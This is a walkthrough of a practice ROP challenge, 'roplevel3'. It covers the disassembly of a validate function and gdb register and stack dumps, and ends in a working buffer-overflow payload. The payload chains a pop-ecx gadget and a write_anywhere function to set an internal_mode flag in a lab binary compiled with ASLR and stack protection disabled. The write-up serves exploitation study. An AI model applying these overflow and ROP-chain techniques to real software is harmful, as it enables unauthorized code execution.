### How to compile binary (disable ASLR & PIE):

```
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
gcc roplevel3.c -o roplevel3 -fno-stack-protector -m32 -Wl,-z,norelro -mpreferred-stack-boundary=2 -no-pie
```

### Analysis

```
pwndbg> disas validate
Dump of assembler code for function validate:
   0x0804928b <+0>:	push   ebp
   0x0804928c <+1>:	mov    ebp,esp
   0x0804928e <+3>:	push   ebx
   0x0804928f <+4>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x08049294 <+9>:	add    ebx,0x2244
   0x0804929a <+15>:	lea    eax,[ebx-0x13d8]
   0x080492a0 <+21>:	push   eax
   0x080492a1 <+22>:	push   DWORD PTR [ebp+0x8]
   0x080492a4 <+25>:	call   0x8049030 <strcmp@plt>
   0x080492a9 <+30>:	add    esp,0x8
   0x080492ac <+33>:	test   eax,eax
   0x080492ae <+35>:	jne    0x80492b7 <validate+44>
   0x080492b0 <+37>:	call   0x80491b6 <func>
   0x080492b5 <+42>:	jmp    0x804931b <validate+144>
   0x080492b7 <+44>:	lea    eax,[ebx-0x13ba]
   0x080492bd <+50>:	push   eax
   0x080492be <+51>:	push   DWORD PTR [ebp+0x8]
   0x080492c1 <+54>:	call   0x8049030 <strcmp@plt>
   0x080492c6 <+59>:	add    esp,0x8
   0x080492c9 <+62>:	test   eax,eax
   0x080492cb <+64>:	jne    0x80492ef <validate+100>
   0x080492cd <+66>:	mov    eax,DWORD PTR [ebx+0x34]
   0x080492d3 <+72>:	test   eax,eax
   0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
   0x080492d7 <+76>:	lea    eax,[ebx-0x139c]
   0x080492dd <+82>:	push   eax
   0x080492de <+83>:	call   0x8049050 <puts@plt>
   0x080492e3 <+88>:	add    esp,0x4
   0x080492e6 <+91>:	jmp    0x804931b <validate+144>
   0x080492e8 <+93>:	call   0x80491db <func_internal>
   0x080492ed <+98>:	jmp    0x804931b <validate+144>
=> 0x080492ef <+100>:	lea    eax,[ebx-0x13b0]
   0x080492f5 <+106>:	push   eax
   0x080492f6 <+107>:	push   DWORD PTR [ebp+0x8]
   0x080492f9 <+110>:	call   0x8049030 <strcmp@plt>
   0x080492fe <+115>:	add    esp,0x8
   0x08049301 <+118>:	test   eax,eax
   0x08049303 <+120>:	jne    0x804930c <validate+129>
   0x08049305 <+122>:	push   0x0
   0x08049307 <+124>:	call   0x8049070 <exit@plt>
   0x0804930c <+129>:	lea    eax,[ebx-0x1368]
   0x08049312 <+135>:	push   eax
   0x08049313 <+136>:	call   0x8049050 <puts@plt>
   0x08049318 <+141>:	add    esp,0x4
   0x0804931b <+144>:	nop
   0x0804931c <+145>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804931f <+148>:	leave  
   0x08049320 <+149>:	ret    
End of assembler dump.
```

```
gdb-peda$ x $ebx+0x34 // break at validate function after "0x0804928f <+4>:	call   0x80490f0 <__x86.get_pc_thunk.bx>"
0x804b55c <internal_mode>:      0x00000000
gdb-peda$ p (int) internal_mode
$1 = 0x0
```

>0x080492ae <+35>:	jne    0x80492b7 <validate+44>
>
>checks if the number is 1, 
>
>if it is call func then ret and jmp to validate+144 (end)
>
>if it is not jmp to validate+44 and continue
>
> </br>
>0x080492cb <+64>:	jne    0x80492ef <validate+100> 
>
>Checks if the number is 2,
>
>if it is continue
>
>if it is not jmp to 100
>
> </br>
>0x080492d5 <+74>:	jne    0x80492e8 <validate+93>
>
>check if eax is not 0
>
>if eax is not 0 then execute internal_func
>
>if eax is 0 then jmp to validate+144 (end)
>
> </br>
>0x08049303 <+120>:	jne    0x804930c <validate+129>
>
>check if number is 3
>
>if it is 3 then continue and eventually exit
>
>if it is not 3 then continue to validate+129 then to validate+144 (end)

### Answer:

`(python2 -c "print('ZZZZYYYYXXXX' + '\x28\xb5\x04\x08' + 'BBBB' + '\x34\x93\x04\x08' + 'AAAA' + '\x21\x93\x04\x08' + '\x45\x93\x04\x08')" ; cat) | ./roplevel3`

- Need to make sure that `eax` is not 0 which is from `[ebx+0x34]` hence execute BoF to overwrite return pointer and execute write_anywhere() function. This function will move whatever is in `ecx` into `[ebx+0x34]` which is the location of our internal_mode variable. In this case, 'BBBB' is what will be written to `ecx` in our buffer overflow.

- Total padding before overwriting return pointer: 5 * "AAAA"

- 0x08049334: Address of gadget to push ecx to stack. This pops "BBBB" from stack to ecx. Somehow, before the actual `pop ecx` instruction is executed, the top of the stack is as follows:

   ```
   gdb-peda$
   [----------------------------------registers-----------------------------------]
   EAX: 0x804b528 --> 0x804b43c --> 0x1
   EBX: 0x804b528 --> 0x804b43c --> 0x1
   ECX: 0xffffffff
   EDX: 0xffffffff
   ESI: 0xf7fbd000 --> 0x1e7d6c
   EDI: 0xf7fbd000 --> 0x1e7d6c
   EBP: 0xffffd61c ("BBBBAAAA!\223\004\bE\223\004\b")
   ESP: 0xffffd61c ("BBBBAAAA!\223\004\bE\223\004\b")
   EIP: 0x8049341 (<gadget+13>:    pop    ecx)
   EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x8049335 <gadget+1>:        mov    ebp,esp
      0x8049337 <gadget+3>:        call   0x80493ad <__x86.get_pc_thunk.ax>
      0x804933c <gadget+8>:        add    eax,0x21ec
   => 0x8049341 <gadget+13>:       pop    ecx
      0x8049342 <gadget+14>:       nop
      0x8049343 <gadget+15>:       pop    ebp
      0x8049344 <gadget+16>:       ret
      0x8049345 <main>:    push   ebp
   [------------------------------------stack-------------------------------------]
   0000| 0xffffd61c ("BBBBAAAA!\223\004\bE\223\004\b")
   0004| 0xffffd620 ("AAAA!\223\004\bE\223\004\b")
   0008| 0xffffd624 --> 0x8049321 (<write_anywhere>:       push   ebp)
   0012| 0xffffd628 --> 0x8049345 (<main>: push   ebp)
   0016| 0xffffd62c --> 0xffffd600 --> 0x804939a (<main+85>:       add    esp,0x4)
   0020| 0xffffd630 --> 0xf7fbd000 --> 0x1e7d6c
   0024| 0xffffd634 --> 0x0
   0028| 0xffffd638 --> 0xffffd698 --> 0xffffd6b4 --> 0xffffd7d8 ("/home/ernest/offsec-prep/osed-prep/BillyEllis/ROPLevel3/roplevel3")
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   0x08049341 in gadget ()
   gdb-peda$
   ```

- When returning from gadget, the top of stack points to the address after "AAAA" which is write_anywhere, which is what we want

   ```
   gdb-peda$
   [----------------------------------registers-----------------------------------]
   EAX: 0x804b528 --> 0x804b43c --> 0x1
   EBX: 0x804b528 --> 0x804b43c --> 0x1
   ECX: 0x42424242 ('BBBB')
   EDX: 0xffffffff
   ESI: 0xf7fbd000 --> 0x1e7d6c
   EDI: 0xf7fbd000 --> 0x1e7d6c
   EBP: 0x41414141 ('AAAA')
   ESP: 0xffffd624 --> 0x8049321 (<write_anywhere>:        push   ebp)
   EIP: 0x8049344 (<gadget+16>:    ret)
   EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x8049341 <gadget+13>:       pop    ecx
      0x8049342 <gadget+14>:       nop
      0x8049343 <gadget+15>:       pop    ebp
   => 0x8049344 <gadget+16>:       ret
      0x8049345 <main>:    push   ebp
      0x8049346 <main+1>:  mov    ebp,esp
      0x8049348 <main+3>:  push   ebx
      0x8049349 <main+4>:  sub    esp,0xc
   [------------------------------------stack-------------------------------------]
   0000| 0xffffd624 --> 0x8049321 (<write_anywhere>:       push   ebp)
   0004| 0xffffd628 --> 0x8049345 (<main>: push   ebp)
   0008| 0xffffd62c --> 0xffffd600 --> 0x804939a (<main+85>:       add    esp,0x4)
   0012| 0xffffd630 --> 0xf7fbd000 --> 0x1e7d6c
   0016| 0xffffd634 --> 0x0
   0020| 0xffffd638 --> 0xffffd698 --> 0xffffd6b4 --> 0xffffd7d8 ("/home/ernest/offsec-prep/osed-prep/BillyEllis/ROPLevel3/roplevel3")
   0024| 0xffffd63c --> 0x0
   0028| 0xffffd640 --> 0xf7ffd000 --> 0x2bf24
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   0x08049344 in gadget ()
   gdb-peda$
   ```

- 0x804b528: Base location of the `internal_mode` variable

   ```
   gdb-peda$ x 0x0804b528
   0x804b528:      0x0804b43c
   gdb-peda$ x 0x0804b528 + 0x34
   0x804b55c <internal_mode>:      0x00000000
   ```

- Setting 0x804b528 right after 12 bytes of padding will ensure that the `ebx` register will contain the base address of the `internal_mode` variable and adding the 52 decimal or 34 hexadcimal value will get us the actual location of `internal_mode` variable which will then allow us to write to that address with whatever is from `ecx` which should be "BBBB"

- 0x8049345: Start of main function, which is where we want to return to at the end of our rop chain

### Notes

For this exploit to work, we need to know the location of the internal_mode variable and adjust our write_anywhere gadget to allow us to write to it. In this case, from debugging, we know that given that ASLR and PIE is disabled, the base address is 0x0804b528. To obtain this value, but a breakpoint before the `0x080492cd <+66>:	mov    eax,DWORD PTR [ebx+0x34]` instruction and print the value of `ebx` or where ever the program references to get the value of internal_mode.

### References

https://stackoverflow.com/questions/19398216/why-is-there-a-expecting-comma-error-in-y86-code

https://stackoverflow.com/questions/9617877/assembly-jg-jnle-jl-jnge-after-cmp

https://stackoverflow.com/questions/6261392/printing-all-global-variables-local-variables

https://stackoverflow.com/questions/52024529/whats-the-difference-between-nexti-and-stepi-in-gdb
